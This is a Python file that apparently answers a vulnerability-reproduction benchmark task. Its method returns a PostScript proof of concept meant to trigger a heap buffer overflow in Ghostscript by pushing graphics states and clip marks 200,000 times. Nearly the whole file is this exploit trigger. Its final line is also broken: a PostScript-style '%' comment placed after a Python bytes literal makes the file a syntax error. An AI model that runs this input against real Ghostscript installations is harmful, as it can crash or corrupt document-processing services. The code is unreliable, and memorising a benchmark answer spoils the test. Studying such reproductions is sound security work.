import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in Ghostscript.
        
        The vulnerability is described as "nesting depth is not checked before pushing a clip mark".
        This typically affects the PDF14 transparency compositor in Ghostscript.
        
        We generate a PostScript file that:
        1. Wraps execution in a 'stopped' context to catch errors (like limitcheck) in the fixed version.
        2. Attempts to enable the PDF14 device (via .setopacityalpha).
        3. Executes a tight loop that repeatedly pushes graphics states ('gsave') and clip marks ('rectclip').
        4. The vulnerable version will fail to check bounds and overflow the heap.
        5. The fixed version will throw an error (e.g. limitcheck), which we catch and exit gracefully.
        """
        
        poc = (
            b"%!PS\n"
            b"{\n"
            b"  % Attempt to enable transparency to activate the vulnerable stack logic\n"
            b"  { 0.5 .setopacityalpha } stopped pop\n"
            b"  \n"
            b"  % Loop to exhaust the clip/layer stack depth\n"
            b"  % 200,000 iterations should exceed default fixed buffers or reasonably sized heap allocations\n"
            b"  0 1 200000 {\n"
            b"    pop              % Pop the loop index\n"
            b"    gsave            % Push graphics state\n"
            b"    0 0 1 1 rectclip % Push a clip mark\n"
            b"  } for\n"
            b"} stopped pop\n"
            b"quit\n"              % Clean exit (code 0) if error was caught
        )
        
        return poc